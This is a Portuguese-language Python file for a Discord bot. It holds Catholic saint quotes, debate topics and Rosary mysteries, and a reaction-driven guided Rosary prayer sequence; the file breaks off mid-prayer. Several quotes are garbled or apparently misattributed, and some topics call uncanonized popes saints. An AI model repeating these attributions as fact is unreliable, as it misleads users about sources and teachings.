import discord
import os
from discord.ext import commands
import random
from googlesearch import search
import re
intents = discord.Intents.all()
intents.messages = True  # Habilita o intent para receber mensagens
intents.reactions = True

bot = commands.Bot(command_prefix='!', intents=intents)


frases_santos_catolicos = {
    1: "Ama e faz o que quiseres. - Santo Agostinho",
    2: "Nada te perturbe, nada te amedronte. Tudo passa. Só Deus não muda. A paciência tudo alcança. Quem a Deus tem, nada lhe falta. Só Deus basta. - Santa Teresa de Ávila",
    3: "Comece fazendo o que é necessário, depois o que é possível, e de repente você estará fazendo o impossível. - São Francisco de Assis",
    4: "Faz tudo por amor e nada por força, ou por temor a punição. - Santa Teresinha do Menino Jesus",
    5: "Não tenham medo! Abram, ou melhor, escancarem as portas a Cristo! - São João Paulo II",
    6: "Orai, esperai e não vos preocupeis. A preocupação é inútil. Deus é misericordioso e ouvirá a vossa oração. - São Padre Pio de Pietrelcina",
    7: "A cruz é o caminho do cristão. - São José de Cupertino",
    8: "Deus nos fez para Ele, e nosso coração está inquieto até que repouse Nele. - Santo Agostinho",
    9: "Por fim, sabei que o caminho da salvação passa pela cruz. - São João Paulo II",
    10: "Se tiverdes amor uns para com os outros, todos conhecerão que sois meus discípulos. - São João Bosco",
    11: "A humildade é a base de todas as virtudes. - São Vicente de Paulo",
    12: "É de sua falta de amor próprio que o Senhor tem pena; e enquanto você está se depreciando, Ele lhe oferece a Sua mão. - Santa Teresinha do Menino Jesus",
    13: "O amor nunca está tranquilo enquanto não atingir a perfeição. - São Francisco de Sales",
    14: "Onde não há amor, põe amor e encontrarás amor. - São João da Cruz",
    15: "A oração é a melhor arma que temos; é a chave para o coração de Deus. - São Pio de Pietrelcina",
    16: "Quando servimos os pobres e os doentes, servimos a Jesus. Não devemos ter medo de servir os pobres, porque na realidade estamos a servir a Jesus Cristo. - Santa Teresa de Calcutá",
    17: "A vida eterna é o fruto da caridade. - Santo Agostinho",
    18: "A alma que quer amar a Deus não se importa de sofrer. - Santa Teresa de Ávila",
    19: "A esperança é um risco que deve ser corrido. - São Josémaría Escrivá",
    20: "A maior coisa que o ser humano pode fazer neste mundo é ver algo e dizer: 'Se Deus quiser, eu também quero isso.' - São Jerônimo Emiliani",
    21: "A obra de Deus não se realiza sem sofrimento. - São Pio de Pietrelcina",
    22: "As cruzes que vêm sem avisar são aprovadas com antecedência. - Santa Teresa do Menino Jesus",
    23: "A verdadeira caridade consiste em fazer o bem a quem nada pode retribuir-nos. - São Padre Pio de Pietrelcina",
    24: "Confie inteiramente na graça de Deus, porque Ele é suficiente para nós. - São João XXIII",
    25: "Deus não nos manda coisas impossíveis, mas quando Ele manda, Ele nos comanda fazer o que pudermos e pedir o que não podemos. - São Francisco de Sales",
    26: "É impossível comunicar a Deus e permanecer infeliz. - São João da Cruz",
    27: "Encontre Deus em tudo, faça tudo por ele e nunca olhe para nada, exceto para ele, e então você encontrará alegria. - São João Bosco",
    28: "Eu sinto o fogo da caridade em meu coração, mas não sei como dar vazão a ele. - São João Vianney",
    29: "Força e fraqueza são as duas armas que estão conosco no combate da vida: um comandante forte, a esperança, um espião forte, o prazer; e todos os outros, o medo, a riqueza, a ambição, a preguiça. - São Francisco de Sales",
    30: "Levantei-me, fiz o bem, e abracei-me ao serviço, e foi-me dado como a sua promessa. - São João XXIII",
    31: "O amor de Deus é perfeito e permanece para sempre. - Santa Teresa de Ávila",
    32: "O homem que ama é feliz porque encontra a sua felicidade em Deus, e Deus é eterno, e um ato de amor tem a eternidade. - Santa Teresinha de Lisieux",
    33: "O homem que tem fé e confiança em Deus, com razão, com o mal, é feliz em todo o seu caminho. - São Bernardo de Claraval",
    34: "O homem que teme a Deus não o obedece, e o malvado e o justo de ter uma má compreensão de Deus. - Santo Agostinho",
    35: "O meio mais seguro de evitar as tentações do inimigo é voar dele sem lhe dar ocasião de nos atacar. - São Padre Pio de Pietrelcina",
    36: "O tempo perdido nunca se recupera. - São João Bosco",
    37: "Os homens não se convertem com argumentos racionais. - São João Bosco",
    38: "Quando não puderes mais, Jesus pega na tua mão, leva-te para o deserto e fala-te ao coração. - Santa Teresa de Calcutá",
    39: "Quem canta, reza duas vezes. - Santo Agostinho",
    40: "Quem conhece Jesus Cristo conhece também a sua grandeza. - São Francisco de Sales",
    41: "Quem não tem virtudes próprias, adquire as dos bons com que se cerca. - São Vicente de Paulo",
    42: "Quem trabalha com as mãos é um trabalhador, quem trabalha com as mãos e a cabeça é um artesão, quem trabalha com as mãos, a cabeça e o coração é um artista. - São Francisco de Assis",
    43: "Sofrer é amar, nada nos faz tão semelhantes a Jesus como o sofrimento. - Santa Teresa do Menino Jesus",
    44: "Sua vida é o bem-aventurado por Deus. - São Pio de Pietrelcina",
    45: "Toda a nossa vida está sujeita à vontade de Deus. - São Francisco de Assis",
    46: "Todo o nosso descontentamento por aquilo que nos falta procede da nossa falta de gratidão por aquilo que temos. - São Francisco de Sales",
    47: "Trabalha como se tudo dependesse de ti, e ora como se tudo dependesse de Deus. - São Inácio de Loyola",
    48: "Tudo o que Deus permite é para o bem daqueles que o amam. - São Pio de Pietrelcina",
    49: "Um momento de Deus é mais do que a vida inteira, e a sua vista de Deus é o seu amor. - São Bernardo de Claraval", }



sugestoes_debate = {
    1: "A existência de Deus: argumentos filosóficos e teológicos.",
    2: "A natureza da fé e da razão na busca pela verdade religiosa.",
    3: "A distinção entre revelação divina e conhecimento natural na teologia.",
    4: "A relação entre a vontade de Deus e o livre-arbítrio humano.",
    5: "A teoria da lei divina e sua aplicação na moralidade humana.",
    6: "A natureza da alma humana e sua relação com o corpo na escatologia.",
    7: "A hierarquia dos valores éticos na perspectiva cristã.",
    8: "A interpretação da Escritura Sagrada e a tradição na teologia católica.",
    9: "A relação entre a graça divina e as obras humanas na salvação.",
    10: "A teoria dos sacramentos e sua eficácia na vida espiritual dos fiéis.",
    11: "A influência das virtudes teologais (fé, esperança e caridade) na vida cristã.",
    12: "A relação entre a providência divina e o sofrimento humano.",
    13: "A visão da justiça e do direito na filosofia tomista.",
    14: "A teoria da guerra justa e sua aplicação ética no contexto histórico.",
    15: "A missão da Igreja na evangelização e na promoção da justiça social.",
    16: "O papel da contemplação na vida espiritual segundo Santo Agostinho.",
    17: "A relação entre as razão e a revelação divina na filosofia de Santo Anselmo.",
    18: "A teoria da participação divina na criação segundo São Boaventura.",
    19: "A visão agostiniana da graça divina e sua influência na salvação.",
    20: "A teologia mística de São Bernardo de Claraval e sua aplicação espiritual.",
    21: "O conceito de amor divino na obra de Santa Teresa de Ávila.",
    22: "A espiritualidade franciscana e seu impacto na vida dos fiéis.",
    23: "A teoria da iluminação divina em São João da Cruz.",
    24: "A influência da devoção mariana na vida espiritual segundo São Luís de Montfort.",
    25: "A doutrina da transubstanciação na teologia de Santo Tomás de Aquino.",
    26: "A relação entre a fé e a razão na obra de São Justino Mártir.",
    27: "A defesa da liberdade religiosa na obra de São Tomás Moro.",
    28: "A importância da caridade na obra social de São Vicente de Paulo.",
    29: "A teologia do corpo em São João Paulo II e sua contribuição para a moralidade sexual.",
    30: "A visão dos santos sobre a importância da liturgia na vida espiritual.",
    31: "A doutrina da imaculada conceição segundo Santa Catarina de Sena.",
    32: "A teoria da providência divina em São Gregório de Nissa.",
    33: "A abordagem das virtudes cardinais na moral cristã segundo São Tomás de Aquino.",
    34: "A influência da escolástica na formação da teologia medieval.",
    35: "O conceito de santidade e seu papel na vida dos santos católicos.",
    36: "A relação entre pobreza e humildade na espiritualidade franciscana.",
    37: "A defesa da vida e da dignidade humana na teologia de São João Paulo II.",
    38: "A missão dos santos na evangelização e na promoção da paz mundial.",
    39: "A relação entre a contemplação e a ação na espiritualidade carmelita.",
    40: "A teologia da cruz em São João da Cruz e a redenção humana.",
    41: "A visão dos santos sobre a importância da confissão sacramental.",
    42: "A teoria do pecado original segundo Santo Agostinho e suas implicações.",
    43: "A relação entre a ecologia e a doutrina social da Igreja.",
    44: "A visão de São Francisco de Assis sobre a harmonia entre criatura e criador.",
    45: "A teoria da justiça divina na Suma Teológica de São Tomás de Aquino.",
    46: "A influência dos pais da Igreja na formação do pensamento teológico.",
    47: "A teoria do martírio na vida dos mártires cristãos.",
    48: "A importância da educação religiosa na formação da consciência católica.",
    49: "A contribuição dos doutores da Igreja para a teologia e espiritualidade.",
    50: "A doutrina da ressurreição dos mortos segundo os ensinamentos de Santo Agostinho.",
    51: "A visão da pobreza evangélica na espiritualidade de São Francisco de Assis.",
    52: "A teoria da escravidão do pecado em São Paulo e sua superação pela graça.",
    53: "A defesa da dignidade da mulher na teologia de Santa Teresa de Ávila.",
    54: "A relação entre a liturgia e a vida espiritual na obra de São Bento.",
    55: "A importância da oração contemplativa na espiritualidade carmelita.",
    56: "A teologia da encarnação e sua relevância na redenção humana.",
    57: "A defesa da liberdade de consciência na obra de São Tomás de Aquino.",
    58: "A teoria do mal e do pecado na teologia de Santo Agostinho.",
    59: "A influência da filosofia grega na formação do pensamento cristão.",
    60: "A teoria da predestinação na teologia de São Bernardo de Claraval.",
    61: "A visão do sacrifício eucarístico na teologia de Santo Inácio de Antioquia.",
    62: "A relação entre a contemplação e a ação social na vida de Santa Teresa de Calcutá.",
    63: "A teologia do martírio na obra de São Cipriano de Cartago.",
    64: "A defesa da liberdade religiosa na obra de São João XXIII.",
    65: "A teoria da unidade da Igreja na obra de São Cipriano de Cartago.",
    66: "A visão do amor divino na obra de São Francisco de Sales.",
    67: "A relação entre fé e ciência na obra de São Roberto Belarmino.",
    68: "A teoria da encarnação e sua importância na salvação segundo Santo Atanásio.",
    69: "A influência dos primeiros mártires cristãos na expansão do cristianismo.",
    70: "A teoria do conhecimento de Deus na obra de Santo Anselmo.",
    71: "A visão da santidade na vida de Santa Teresinha do Menino Jesus.",
    72: "A defesa da dignidade da pessoa humana na encíclica 'Pacem in Terris' de São João XXIII.",
    73: "A teologia da misericórdia divina na obra de São Faustina Kowalska.",
    74: "A relação entre fé e obras na carta de São Tiago.",
    75: "A teoria do sacrifício na liturgia cristã segundo Santo Ambrósio.",
    76: "A visão da unidade da Igreja na obra de São Cipriano de Cartago.",
    77: "A teologia da esperança na obra de São Gregório de Nissa.",
    78: "A defesa da liberdade de consciência na obra de São Tomás Moro.",
    79: "A teoria da justificação pela fé na obra de São Paulo.",
    80: "A visão do amor divino na obra de Santa Teresa de Ávila.",
    81: "A relação entre o bem comum e a lei natural na filosofia de Santo Tomás de Aquino.",
    82: "A teoria da penitência na teologia de São João Crisóstomo.",
    83: "A defesa dos direitos humanos na encíclica 'Pacem in Terris' de São João XXIII.",
    84: "A teologia do matrimônio na obra de São João Paulo II.",
    85: "A visão da providência divina na teologia de São Gregório de Nissa.",
    86: "A relação entre a sabedoria e a caridade na vida de São Francisco de Sales.",
    87: "A teoria da imortalidade da alma na filosofia de Santo Agostinho.",
    88: "A defesa da dignidade da pessoa humana na encíclica 'Rerum Novarum' de São Leão XIII.",
    89: "A teologia do perdão na obra de São Pedro Crisólogo.",
    90: "A visão da comunhão dos santos na obra de Santo Agostinho.",
    91: "A relação entre a caridade e a justiça na encíclica 'Caritas in Veritate' de São Bento XVI.",
    92: "A teoria da salvação universal na obra de São Gregório de Nissa.",
    93: "A influência da espiritualidade cisterciense na vida monástica.",
    94: "A teologia do martírio na obra de São Policarpo de Esmirna.",
    95: "A visão da pobreza evangélica na espiritualidade de São Francisco de Assis.",
    96: "A relação entre a liturgia e a vida espiritual na obra de São Bento.",
    97: "A teoria da oração na obra de São João Cassiano.",
    98: "A crítica ao relativismo moral na filosofia contemporânea.",
    99: "A defesa da liberdade de expressão e a censura na sociedade atual.",
    100: "A influência das ideias marxistas na cultura e na política moderna.",
    101: "A crítica ao multiculturalismo e seu impacto na identidade cultural.",
    102: "A teoria da conspiração e sua influência na interpretação dos eventos históricos.",
    103: "A relação entre a filosofia política e os direitos individuais.",
    104: "A crítica à hegemonia cultural e seus efeitos na liberdade de pensamento.",
    105: "A importância da educação clássica na formação intelectual.",
    106: "A defesa da racionalidade e da lógica na argumentação filosófica.",
    107: "A crítica ao pensamento pós-moderno e suas consequências na sociedade.",
    108: "A teoria do conhecimento e a busca pela verdade objetiva.",
    109: "A relação entre religião e política na formação dos Estados modernos.",
    110: "A crítica à ideologia de gênero e suas implicações na educação.",
    111: "A importância da ética e da moralidade na vida pública.",
    112: "A crítica ao niilismo e a busca por um sentido na vida contemporânea.",
    113: "A teoria da conspiração e sua influência na política internacional.",
    114: "A relação entre ciência e religião na interpretação dos fenômenos naturais.",
    115: "A crítica ao historicismo e suas consequências na interpretação da história.",
    116: "A importância da tradição e da continuidade cultural na preservação da identidade nacional.",
    117: "A crítica à globalização e seus efeitos na economia global.",
    118: "A defesa da liberdade individual e os limites do poder estatal.",
    119: "A crítica ao politicamente correto e suas implicações na liberdade de expressão.",
    120: "A importância da educação liberal na formação de cidadãos críticos.",
    121: "A crítica à agenda ambientalista e suas consequências econômicas.",
    122: "A relação entre mídia e poder na formação da opinião pública.",
    123: "A crítica à hegemonia cultural e sua influência na produção artística.",
    124: "A importância da família tradicional na estruturação da sociedade.",
    125: "A crítica ao cientificismo e suas limitações na compreensão da realidade.",
    126: "A defesa da democracia liberal e seus desafios no século XXI.",
    127: "A crítica ao multiculturalismo e sua influência na coesão social.",
    128: "A importância da filosofia política na compreensão dos sistemas de governo.",
    129: "A crítica ao marxismo cultural e suas estratégias de transformação social.",
    130: "A relação entre tradição e inovação na cultura contemporânea.",
    131: "A crítica ao relativismo moral e sua influência na ética pública.",
    132: "A importância da liberdade econômica na prosperidade das nações.",
    133: "A crítica à burocracia estatal e suas consequências na eficiência administrativa.",
    134: "A relação entre religião e ciência na interpretação dos mistérios do universo.",
    135: "A crítica ao feminismo radical e suas implicações nas relações de gênero.",
    136: "A importância da arte clássica na educação estética.",
    137: "A crítica à educação progressista e seus efeitos na formação intelectual.",
    138: "A defesa da soberania nacional e os desafios da globalização.",
    139: "A crítica ao revisionismo histórico e suas consequências na memória coletiva.",
    140: "A relação entre literatura e sociedade na formação da consciência cultural.",
    141: "A crítica à ideologia de gênero e suas implicações na educação sexual.",
    142: "A importância da literatura clássica na formação moral dos indivíduos.",
    143: "A crítica ao positivismo jurídico e suas limitações na interpretação das leis.",
    144: "A defesa da liberdade religiosa e os desafios da intolerância.",
    145: "A crítica à ideia de progresso linear e suas consequências na política moderna.",
    146: "A relação entre moralidade e direito na construção da ordem social.",
    147: "A crítica à burocracia estatal e sua influência na administração pública.",
    148: "A importância da liberdade de imprensa na garantia dos direitos individuais.",
    149: "A crítica ao relativismo cultural e suas implicações na identidade nacional.",
    150: "A defesa da educação clássica e sua relevância na formação humanística.",

}

misterios = {
    'Mistérios gozosos': {
         1: "Anunciação a Maria: «No sexto mês, o anjo Gabriel foi enviado por Deus a uma cidade da Galiléia, chamada Nazaré,  a uma virgem desposada com um homem que se chamava José, da casa de Davi e o nome da virgem era Maria» (Lc 1, 26-27). ",
         2: "Visitação de Nossa Senhora a sua prima Isabel: «Naqueles dias, Maria se levantou e foi às pressas às montanhas, a uma cidade de Judá. Entrou em casa de Zacarias e saudou Isabel. Ora, apenas Isabel ouviu a saudação de Maria, a criança estremeceu no seu seio; e Isabel ficou cheia do Espírito Santo. E exclamou em alta voz: \"Bendita és tu entre as mulheres e bendito é o fruto do teu ventre\"» (Lc 1, 39-42).",
         3: "Nascimento de Jesus: «Naqueles tempos apareceu um decreto de César Augusto, ordenando o recenseamento de toda a terra. Este recenseamento foi feito antes do governo de Quirino, na Síria.  Todos iam alistar-se, cada um na sua cidade. Também José subiu da Galiléia, da cidade de Nazaré, à Judéia, à Cidade de Davi, chamada Belém, porque era da casa e família de Davi,  para se alistar com a sua esposa Maria, que estava grávida.  Estando eles ali, completaram-se os dias dela. E deu à luz seu filho primogênito, e, envolvendo-o em faixas, reclinou-o num presépio; porque não havia lugar para eles na hospedaria» (Lc 2,1-7).",
         4: "Apresentação do Menino Jesus no Templo: «Completados que foram os oito dias para ser circuncidado o menino, foi-lhe posto o nome de Jesus, como lhe tinha chamado o anjo, antes de ser concebido no seio materno. Concluídos os dias da sua purificação segundo a Lei de Moisés, levaram-no a Jerusalém para o apresentar ao Senhor, conforme o que está escrito na lei do Senhor: Todo primogênito do sexo masculino será consagrado ao Senhor; e para oferecerem o sacrifício prescrito pela lei do Senhor, um par de rolas ou dois pombinhos.» (Lc 2, 21-24).",
         5: "«Perda e encontro do Menino Jesus no Templo: Seus pais iam todos os anos a Jerusalém para a festa da Páscoa. Tendo ele atingido doze anos, subiram a Jerusalém, segundo o costume da festa. Acabados os dias da festa, quando voltavam, ficou o menino Jesus em Jerusalém, sem que os seus pais o percebessem...Três dias depois o acharam no templo, sentado no meio dos doutores, ouvindo-os e interrogando-os. Todos os que o ouviam estavam maravilhados da sabedoria de suas respostas» (Lc 2, 41-47)",
    },
       'Mistérios luminosos': {
         1: "Batismo de Jesus no rio Jordão: «Depois que Jesus foi batizado, saiu logo da água. Eis que os céus se abriram e viu descer sobre ele, em forma de pomba, o Espírito de Deus. E do céu baixou uma voz: \"Eis meu Filho muito amado em quem ponho minha afeição\"» (Mt 3,16-17).",
         2: "Auto-revelação de Jesus nas Bodas de Caná: «Três dias depois, celebravam-se bodas em Caná da Galiléia, e achava-se ali a mãe de Jesus. Também foram convidados Jesus e os seus discípulos. Como viesse a faltar vinho, a mãe de Jesus disse-lhe: \"Eles já não têm vinho\". Respondeu-lhe Jesus: \"Mulher, isso compete a nós? Minha hora ainda não chegou\". Disse, então, sua mãe aos serventes: \"Fazei o que ele vos disser\"». (Jo 2, 1-5)",
         3: "Anúncio do Reino de Deus: «Completou-se o tempo e o Reino de Deus está próximo; fazei penitência e crede no Evangelho». (Mc 1, 15)",
         4: "Transfiguração de Jesus: «Seis dias depois, Jesus tomou consigo Pedro, Tiago e João, seu irmão, e conduziu-os à parte a uma alta montanha.Lá se transfigurou na presença deles: seu rosto brilhou como o sol, suas vestes tornaram-se resplandecentes de brancura» (Mt 17, 1-2).",
         5: "Instituição da Eucaristia: «Durante a refeição, Jesus tomou o pão, benzeu-o, partiu-o e o deu aos discípulos, dizendo: \"Tomai e comei, isto é meu corpo\"» (Mt 26, 26).",
    },
       'Mistérios dolorosos': {
         1: "Agonia de Jesus no Horto: «Retirou-se Jesus com eles para um lugar chamado Getsêmani e disse-lhes: \"Assentai-vos aqui, enquanto eu vou ali orar\". E, tomando consigo Pedro e os dois filhos de Zebedeu, começou a entristecer-se e a angustiar-se. Disse-lhes, então: \"Minha alma está triste até a morte. Ficai aqui e vigiai comigo\". Adiantou-se um pouco e, prostrando-se com a face por terra, assim rezou: \"Meu Pai, se é possível, afasta de mim este cálice! Todavia não se faça o que eu quero, mas sim o que tu queres\"» (Mt 26, 36-39).",
         2: "Flagelação de Jesus: «Então lhes soltou Barrabás; mas a Jesus mandou açoitar, e o entregou para ser crucificado» (Mt 27,26).",
         3: "Coroação de Espinhos: «Os soldados do governador conduziram Jesus para o pretório e rodearam-no com todo o pelotão. Arrancaram-lhe as vestes e colocaram-lhe um manto escarlate. Depois, trançaram uma coroa de espinhos, meteram-lha na cabeça e puseram-lhe na mão uma vara. Dobrando os joelhos diante dele, diziam com escárnio: \"Salve, rei dos judeus!\"» (Mt 27, 27-29).",
         4: "Jesus carregando a cruz no caminho do Calvário: «Passava por ali certo homem de Cirene, chamado Simão, que vinha do campo, pai de Alexandre e de Rufo, e obrigaram-no a que lhe levasse a cruz. Conduziram Jesus ao lugar chamado Gólgota, que quer dizer lugar do crânio» (Mc 15, 21-22).",
         5: "Crucifixão e morte de Jesus: «Chegados que foram ao lugar chamado Calvário, ali o crucificaram, como também os ladrões, um à direita e outro à esquerda. E Jesus dizia: \"Pai, perdoa-lhes; porque não sabem o que fazem\"... Era quase à hora sexta e em toda a terra houve trevas até a hora nona. Escureceu-se o sol e o véu do templo rasgou-se pelo meio. Jesus deu então um grande brado e disse: \"Pai, nas tuas mãos entrego o meu espírito\". E, dizendo isso, expirou» (Lc  23, 33-46).",
    },
       'Mistérios gloriosos': {
         1: "Ressurreição de Jesus: «No primeiro dia da semana, muito cedo, dirigiram-se ao sepulcro com os aromas que haviam preparado. Acharam a pedra removida longe da abertura do sepulcro. Entraram, mas não encontraram o corpo do Senhor Jesus. Não sabiam elas o que pensar, quando apareceram em frente delas dois personagens com vestes resplandecentes. Como estivessem amedrontadas e voltassem o rosto para o chão, disseram-lhes eles: \"Por que buscais entre os mortos aquele que está vivo? Não está aqui, mas ressuscitou\"» (Lc 24, 1-6).",
         2: "Ascensão de Jesus ao Céu: «Depois que o Senhor Jesus lhes falou, foi levado ao céu e está sentado à direita de Deus» (Mc 16, 19). ",
         3: "Vinda do Espírito Santo sobre os Apóstolos: «Chegando o dia de Pentecostes, estavam todos reunidos no mesmo lugar. De repente, veio do céu um ruído, como se soprasse um vento impetuoso, e encheu toda a casa onde estavam sentados. Apareceu-lhes então uma espécie de línguas de fogo que se repartiram e pousaram sobre cada um deles. Ficaram todos cheios do Espírito Santo e começaram a falar em línguas, conforme o Espírito Santo lhes concedia que falassem» (At 2, 1-4).",
         4: "Assunção de Maria: «Por isto, desde agora, me proclamarão bem-aventurada todas as gerações, porque realizou em mim maravilhas aquele que é poderoso e cujo nome é Santo» (Lc 1, 48-49).",
         5: " Coroação de Maria no Céu: «Apareceu em seguida um grande sinal no céu: uma Mulher revestida do sol, a lua debaixo dos seus pés e na cabeça uma coroa de doze estrelas» (Ap 12, 1).",
    }
}



async def rosario_portugues(message):    
    resposta3_p = await message.channel.send(f'## Escolha um mistério: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} >   🔵    **MISTÉRIOS GOZOSOS** {os.linesep} > {os.linesep} >   🟡    **MISTÉRIOS LUMINOSOS** {os.linesep} > {os.linesep} >   🔴    **MISTÉRIOS DOLOROSOS** {os.linesep} > {os.linesep} >   🟤    **MISTÉRIOS GLORIOSOS** {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await resposta3_p.add_reaction('🔵')
    await resposta3_p.add_reaction('🟡')
    await resposta3_p.add_reaction('🔴')
    await resposta3_p.add_reaction('🟤')

    def check_misterio_p(reaction, user):
        return user == message.author and str(reaction.emoji) in ['🔵', '🟡', '🔴', '🟤'] and reaction.message.id == resposta3_p.id


    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=check_misterio_p)

    misterio_p = "null"
    if str(reaction.emoji) == '🔵':
        misterio_p = "Mistérios gozosos"
    elif str(reaction.emoji) == '🟡':
        misterio_p = "Mistérios luminosos"
    elif str(reaction.emoji) == '🔴':
        misterio_p = "Mistérios dolorosos"
    elif str(reaction.emoji) == '🟤':  
        misterio_p = "Mistérios gloriosos"


    sinalcruz = await message.channel.send(f'## Fazer sinal da Cruz: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Pelo sinal da Santa Cruz, ✠ livrai-nos,** {os.linesep} > {os.linesep} > **Deus, nosso Senhor, ✠ dos nossos** {os.linesep} > **inimigos.** {os.linesep} > {os.linesep} > **Em nome do Padre, ✠ e do Filho, e do** {os.linesep} > **Espírito Santo. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await sinalcruz.add_reaction('✅')
    
    def prossegue_p_1(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == sinalcruz.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_1)

    sao_jose_p = await message.channel.send(f'## Colocar-se na presença de Deus, recorrendo a São José: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Senhor, quem sou eu para me atrever a comparecer diante de Vossa presença?** {os.linesep} > **Conheço a deficiência de meus méritos e a multidão de meus pecados, pelos quais** {os.linesep} > **não mereço ser ouvido em minhas orações, mas o que não mereço, merece-o o pai** {os.linesep} > **nutrício de Jesus; o que não posso, ele pode. Venho, portanto, com toda a confiança,** {os.linesep} > **implorar a divina clemência, não fiado em minha fraqueza, mas no poder e** {os.linesep} > **validamento de São José.** {os.linesep} > {os.linesep} > **Jesus, que por uma inefável providência dignastes-Vos escolher o bem-aventurado** {os.linesep} > **esposo de Vossa Mãe Santíssima, concedei-nos que aquele mesmo que veneramos** {os.linesep} > **como protetor, mereçamos tê-lo no Céu por nosso intercessor. Vós que viveis e reinais** {os.linesep} > **por todos os séculos dos séculos. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await sao_jose_p.add_reaction('✅')



    def prossegue_p_2(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == sao_jose_p.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_2)
    
    espirito_santo = await message.channel.send(f'## Vinde, Espírito Santo {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Vinde, Espírito Santo, enchei os** {os.linesep} > **corações dos Vossos fiéis e acendei** {os.linesep} > **neles o fogo do Vosso divino amor** {os.linesep} > **℣. Enviai o Vosso Santo Espírito e tudo** {os.linesep} > **será criado.** {os.linesep} > **℟. E renovareis a face da terra.** {os.linesep} > {os.linesep} > **Oremos: Ó Deus, que instruístes os** {os.linesep} > **corações dos Vossos fiéis com a luz do** {os.linesep} > **Espírito Santo, fazei que apreciemos** {os.linesep} > **retamente todas as coisas segundo o** {os.linesep} > **mesmo Espírito e que gozemos sempre** {os.linesep} > **da Sua consolação. Por Cristo Senhor** {os.linesep} > **nosso. Amém.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await espirito_santo.add_reaction('✅')

    def prossegue_p_3(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == espirito_santo.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_3)



    contricao = await message.channel.send(f'## Ato de Contrição {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Senhor meu Jesus Cristo, Deus e Homem verdadeiro, Criador e Redentor meu, por** {os.linesep} > **serdes Vós quem sois, sumamente bom e digno de ser amado sobre todas as coisas,** {os.linesep} > **e porque Vos amo e estimo, pesa-me, Senhor, de todo o meu coração, por Vos ter** {os.linesep} > **ofendido; pesa-me também por ter perdido o Céu e merecido o Inferno. E proponho** {os.linesep} > **firmemente, ajudado com o auxílio da Vossa divina graça, emendar-me e nunca mais** {os.linesep} > **Vos tornar a ofender. Espero alcançar o perdão de minhas culpas, pela Vossa infinita** {os.linesep} > **misericórdia. Amém.**{os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await contricao.add_reaction('✅')

    def prossegue_p_4(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == contricao.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_4)

    santissima = await message.channel.send(f'## Pedir à Santíssima Virgem permissão e graça para louvá-la: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **℣. Fazei-me digno de vos louvar, ó** {os.linesep} > **sagrada Virgem.** {os.linesep} > **℟. Dai-me força contra os vossos** {os.linesep} > **inimigos.** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _')
    await santissima.add_reaction('✅')

    def prossegue_p_5(reaction, user):
        return user == message.author and str(reaction.emoji) == '✅' and reaction.message.id == santissima.id

    reaction, user = await bot.wait_for('reaction_add', timeout=600.0, check=prossegue_p_5)


    #
    oferecimento = await message.channel.send(f'## Fazer o oferecimento do Santo Rosário: {os.linesep} > _ _ _ _ _ _ _ _ _ _ _ _ _ _  {os.linesep} > **Uno-me a todos os Santos que estão no céu, a todos os justos que estão sobre a** {os.linesep} > **terra, a todas as almas fiéis que estão neste lugar. Uno-me a Vós, meu Jesus, para** {os.linesep} > **louvar dignamente Vossa Santa Mãe e louvar-Vos a Vós, n’Ela e por Ela. Renuncio a** {os.linesep} > **todas as distrações que me sobrevierem durante este Rosário, que quero recitar com** {os.linesep} > **modéstia, atenção e devoção, como se fosse o último de minha vida. Assim seja.** {os.linesep} > {os.linesep} > **Nós Vos oferecemos, Senhor Jesus, este Santo Rosário nas seguintes intenções:** {os.linesep} > {os.linesep} > **•  Em ato de desagravo pelas ofensas dirigidas contra o Vosso Sagrado Coração** {os.linesep} > **e contra o Imaculado Coração de Maria** {os.linesep} > {os.linesep} > **•  Pelo bom sacerdócio de todos os sacerdotes em nossa pátria** {os.linesep} > {os.linesep} > **•  Para que tenha-mos santos papas**  {os.linesep} > {os.linesep} > **•  Pelas vocações religiosas e sacerdotais em nossa pátria**  {os.linesep} > {os.linesep} > **•  Por todos os seminários, pela perseverança dos seminaristas a caminho do** {os.linesep} > **  sacerdócio e pelo progresso das missões** {os.linesep} > {os.linesep} > **•  Pelo alívio das almas do Purgatório** {os.linesep} > {os.linesep} > **•  Pela santificação deste dia** {os.linesep} > {os.linesep} > **•  Pelas intenções do Romano Pontífice** {os.linesep} > {os.linesep} > **•  Pela ruína dos vícios e imoralidades** {os.linesep} > {os.linesep} > **•  Pela conversão dos pecadores, dos pagãos e de nossas famílias** {os.linesep} > {os.linesep} > **• Pelas graças necessárias para nossa salvação** {os.linesep} > {os.linesep} > **•  Pelo aumento do nosso fervor** {os.linesep} > {os.linesep} > **•  Para que tenhamos horror e ódio ao pecado** {os.linesep} > {os.linesep} > **•  Para que todos os fiéis tomem ciência da Apostasia reinante** {os.linesep} > {os.linesep} > Reaja para continuar: {os.linesep} > 